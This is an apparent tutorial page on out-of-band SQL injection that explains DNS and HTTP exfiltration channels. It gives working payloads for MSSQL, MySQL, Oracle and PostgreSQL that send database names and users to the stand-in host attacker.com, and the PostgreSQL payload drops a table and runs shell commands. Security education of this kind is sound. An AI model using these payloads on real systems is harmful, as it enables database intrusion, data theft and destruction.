---
title: 'Out-of-Band SQL Injection (OOB)'
description: 'DNS exfiltration, when to use it, and practical examples for MySQL and MSSQL out-of-band SQL injection.'
icon: material/satellite-uplink
tags:
  - sql-injection
  - out-of-band
  - dns-exfiltration
---

# Out-of-Band SQL Injection (OOB)

Out-of-Band (OOB) SQL Injection is an advanced technique used when both in-band and inferential (blind) methods fail. This typically happens when:

1. The query results are **completely asynchronous** (e.g., the web app inserts data into a queue, and a backend worker processes it later).
2. The server filters or blocks the HTTP response if an error occurs.
3. Time delays are impossible or heavily filtered.

In an OOB attack, the attacker forces the database server to initiate an **outbound network request** (usually a DNS lookup or an HTTP request) to an infrastructure controlled by the attacker, effectively carrying the exfiltrated data within the request itself.

---

## DNS Exfiltration

The most common OOB channel is **DNS**. Why? Because even highly secured enterprise databases often need to resolve domain names, and outbound DNS traffic (port 53) is frequently allowed through corporate firewalls.

### How It Works

1. The attacker registers a domain they control (e.g., `attacker.com`).
2. The attacker sets up a DNS server to log all sub-domain lookups for `attacker.com` (tools like Burp Collaborator or `interact.sh` make this easy).
3. The attacker injects a SQL payload that reads sensitive data, concatenates it as a sub-domain, and triggers a DNS lookup for `[data].attacker.com`.
4. The database queries a DNS resolver, which eventually asks the attacker's DNS server for the IP of `[data].attacker.com`.
5. The attacker checks their DNS logs and extracts the `[data]`.

---

## OOB Exploitation by DBMS

### Microsoft SQL Server (MSSQL)

MSSQL is traditionally the easiest target for OOB exploitation because it has built-in stored procedures that make network requests.

#### `master..xp_dirtree`

The `xp_dirtree` procedure is meant to list files in a directory. If you provide a UNC path (a network share), Windows will perform a DNS lookup to resolve the hostname.

```sql title="MSSQL DNS Exfiltration"
-- The payload to extract the database name
'; DECLARE @data VARCHAR(1024);
SELECT @data = (SELECT DB_NAME());
EXEC('master..xp_dirtree "\\' + @data + '.attacker.com\foo"');--
```

When this runs, the database server attempts to access `\\database_name.attacker.com\foo`. It will perform a DNS lookup for `database_name.attacker.com`.

### MySQL / MariaDB

MySQL on Windows can use `LOAD_FILE()` to access network shares via UNC paths, just like MSSQL.

#### `LOAD_FILE()` (Windows Only)

```sql title="MySQL DNS Exfiltration (Windows)"
-- The payload to extract the current user
' OR (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT USER()), '.attacker.com\\foo')))--
```

*Note: This relies on the `secure_file_priv` setting allowing file reads, and it only works when MySQL is hosted on a Windows operating system because Linux does not resolve UNC paths.*

### Oracle

Oracle provides several packages capable of initiating network connections.

#### `UTL_HTTP.REQUEST`

```sql title="Oracle HTTP Exfiltration"
-- Send data via HTTP GET request
' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/' || (SELECT user FROM dual))) IS NOT NULL--
```

#### `UTL_INADDR.GET_HOST_ADDRESS`

```sql title="Oracle DNS Exfiltration"
' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual) || '.attacker.com')) IS NOT NULL--
```

### PostgreSQL

PostgreSQL OOB is generally more difficult unless the user has superuser privileges.

#### `COPY` (Requires Superuser)

If the attacker has superuser rights, they can use the `COPY` command to execute a shell command that performs a DNS lookup or HTTP request (e.g., `curl` or `nslookup`).

```sql title="PostgreSQL OOB via COPY"
'; DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'nslookup ' || (SELECT current_database()) || '.attacker.com';--
```

---

## Handling Special Characters

DNS domain names cannot contain spaces, slashes, or many other special characters. If the data you are trying to extract contains these characters, the DNS lookup will fail.

**Solution: Hex Encode the Data**

Always encode the data before exfiltrating it.

```sql title="MSSQL Hex-Encoded Exfiltration"
'; DECLARE @data VARCHAR(1024);
SELECT @data = (SELECT CONVERT(VARCHAR(max), CONVERT(VARBINARY(max), DB_NAME()), 2));
EXEC('master..xp_dirtree "\\' + @data + '.attacker.com\foo"');--
```

When you receive the DNS lookup (e.g., `6d6173746572.attacker.com`), you simply hex decode `6d6173746572` to get `master`.
